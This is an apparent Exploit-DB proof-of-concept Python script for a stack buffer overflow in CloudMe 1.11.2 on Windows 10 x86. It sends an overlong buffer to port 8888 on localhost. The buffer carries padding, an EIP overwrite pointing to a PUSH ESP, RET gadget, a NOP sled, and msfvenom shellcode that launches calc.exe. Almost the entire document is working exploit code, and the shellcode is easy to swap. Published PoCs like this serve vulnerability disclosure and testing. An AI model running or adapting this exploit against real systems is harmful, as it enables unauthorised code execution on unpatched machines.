# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xbb\x43\xdc\xac\x89\xd9\xea\xd9\x74\x24\xf4\x5f\x29"
payload += b"\xc9\xb1\x52\x31\x5f\x12\x83\xef\xfc\x03\x1c\xd2\x4e"
payload += b"\x7c\x5e\x02\x0c\x7f\x9e\xd3\x71\x09\x7b\xe2\xb1\x6d"
payload += b"\x08\x55\x02\xe5\x5c\x5a\xe9\xab\x74\xe9\x9f\x63\x7b"
payload += b"\x5a\x15\x52\xb2\x5b\x06\xa6\xd5\xdf\x55\xfb\x35\xe1"
payload += b"\x95\x0e\x34\x26\xcb\xe3\x64\xff\x87\x56\x98\x74\xdd"
payload += b"\x6a\x13\xc6\xf3\xea\xc0\x9f\xf2\xdb\x57\xab\xac\xfb"
payload += b"\x56\x78\xc5\xb5\x40\x9d\xe0\x0c\xfb\x55\x9e\x8e\x2d"
payload += b"\xa4\x5f\x3c\x10\x08\x92\x3c\x55\xaf\x4d\x4b\xaf\xd3"
payload += b"\xf0\x4c\x74\xa9\x2e\xd8\x6e\x09\xa4\x7a\x4a\xab\x69"
payload += b"\x1c\x19\xa7\xc6\x6a\x45\xa4\xd9\xbf\xfe\xd0\x52\x3e"
payload += b"\xd0\x50\x20\x65\xf4\x39\xf2\x04\xad\xe7\x55\x38\xad"
payload += b"\x47\x09\x9c\xa6\x6a\x5e\xad\xe5\xe2\x93\x9c\x15\xf3"
payload += b"\xbb\x97\x66\xc1\x64\x0c\xe0\x69\xec\x8a\xf7\x8e\xc7"
payload += b"\x6b\x67\x71\xe8\x8b\xae\xb6\xbc\xdb\xd8\x1f\xbd\xb7"
payload += b"\x18\x9f\x68\x17\x48\x0f\xc3\xd8\x38\xef\xb3\xb0\x52"
payload += b"\xe0\xec\xa1\x5d\x2a\x85\x48\xa4\xbd\xa0\x86\xb6\x3e"
payload += b"\xdd\x94\xb6\x44\xcf\x10\x50\x2e\xff\x74\xcb\xc7\x66"
payload += b"\xdd\x87\x76\x66\xcb\xe2\xb9\xec\xf8\x13\x77\x05\x74"
payload += b"\x07\xe0\xe5\xc3\x75\xa7\xfa\xf9\x11\x2b\x68\x66\xe1"
payload += b"\x22\x91\x31\xb6\x63\x67\x48\x52\x9e\xde\xe2\x40\x63"
payload += b"\x86\xcd\xc0\xb8\x7b\xd3\xc9\x4d\xc7\xf7\xd9\x8b\xc8"
payload += b"\xb3\x8d\x43\x9f\x6d\x7b\x22\x49\xdc\xd5\xfc\x26\xb6"
payload += b"\xb1\x79\x05\x09\xc7\x85\x40\xff\x27\x37\x3d\x46\x58"
payload += b"\xf8\xa9\x4e\x21\xe4\x49\xb0\xf8\xac\x7a\xfb\xa0\x85"
payload += b"\x12\xa2\x31\x94\x7e\x55\xec\xdb\x86\xd6\x04\xa4\x7c"
payload += b"\xc6\x6d\xa1\x39\x40\x9e\xdb\x52\x25\xa0\x48\x52\x6c"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
